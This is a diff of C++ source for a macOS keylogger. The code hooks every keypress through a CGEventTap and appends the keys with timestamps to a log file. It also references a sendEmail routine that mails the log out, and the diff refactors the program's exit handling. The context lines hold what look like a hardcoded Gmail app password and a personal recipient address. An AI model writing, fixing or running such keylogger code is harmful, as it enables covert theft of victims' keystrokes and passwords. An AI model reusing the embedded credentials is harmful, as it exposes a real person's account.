@@ -14,15 +14,15 @@ const char* email_password = "xglvswysuejigfhq"; // Replace with your Gmail pass
 const char* recipient_email = "dennis.pidduck@gmail.com"; // Email address where you want to receive the log
 
 // Function to log the key to a file
-vvoid logKey(const std::string& key) {
+void logKey(const std::string& key) {
     std::ofstream file(logFile, std::ios::app);  // Open file in append mode
     if (file.is_open()) {
-        time_t now = time(0);                     // Get current time
+        time_t now = time(0);  // Get current time
         char* dt = ctime(&now);
 
         // Write timestamp and key
         file << "[" << dt << "] " << key << std::endl;
-        file.close();
+        file.close();  // Ensure the file is closed
     } else {
         std::cerr << "Unable to open log file." << std::endl;
     }
@@ -83,34 +83,33 @@ void sendEmail() {
 }
 
 // Callback function for when a key is pressed
+bool shouldExit = false;  // Add a global flag to control program termination
+
 CGEventRef keyCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* refcon) {
     if (type == kCGEventKeyDown) {
-        // Get the key code
         CGKeyCode keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-        // Map keycodes to strings
-    switch (keycode) {
-        case 0x31: // Spacebar key
-            logKey("Space");
-            break;
-        case 0x24: // Enter key
-            logKey("Enter");
-            break;
-        case 0x30: // Tab key
-            logKey("Tab");
-            break;
-        case 0x33: // Backspace key
-            logKey("Backspace");
-            break;
-        case 0x35: // Esc key
-            logKey("Escape");
-            sendEmail();  
-            exit(0);
-            break;
-        default:
-            logKey("Key code: " + std::to_string(keycode));
-            break;
-    }
+        switch (keycode) {
+            case 0x35:  // Esc key
+                logKey("Escape");
+                shouldExit = true;  // Set the flag to true, signaling the program to exit
+                break;
+            case 0x31:  // Spacebar
+                logKey("Space");
+                break;
+            case 0x24:  // Enter key
+                logKey("Enter");
+                break;
+            case 0x30:  // Tab key
+                logKey("Tab");
+                break;
+            case 0x33:  // Backspace key
+                logKey("Backspace");
+                break;
+            default:
+                logKey("Key code: " + std::to_string(keycode));
+                break;
+        }
     }
     return event;
 }
@@ -119,29 +118,32 @@ int main() {
     CGEventMask eventMask = (1 << kCGEventKeyDown);
 
     CFMachPortRef eventTap = CGEventTapCreate(
-        kCGSessionEventTap,               // Session-level event tap
-        kCGHeadInsertEventTap,            // Insert at the head of the event queue
-        kCGEventTapOptionDefault,         // Default options
-        eventMask,                        // Mask for key down events
-        keyCallback,                      // The callback function
-        nullptr                           // No refcon needed
+        kCGSessionEventTap,
+        kCGHeadInsertEventTap,
+        kCGEventTapOptionDefault,
+        eventMask,
+        keyCallback,
+        nullptr
     );
 
     if (!eventTap) {
         std::cerr << "Failed to create event tap." << std::endl;
-        exit(1);
+        return 1;
     }
 
-    // Create a run loop source and add it to the current run loop
     CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
 
-    // Start capturing key events
+    // Main event loop
     std::cout << "Keylogger started. Press 'Esc' to stop." << std::endl;
-    CFRunLoopRun(); // Start the run loop to capture events
+    while (!shouldExit) {
+        CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0.1, false);  // Check every 0.1 seconds if Esc was pressed
+    }
 
-    // Clean up
+    // Cleanup before exiting
+    std::cout << "Exiting keylogger..." << std::endl;
+    CFRunLoopRemoveSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CFRelease(runLoopSource);
     CFRelease(eventTap);
 
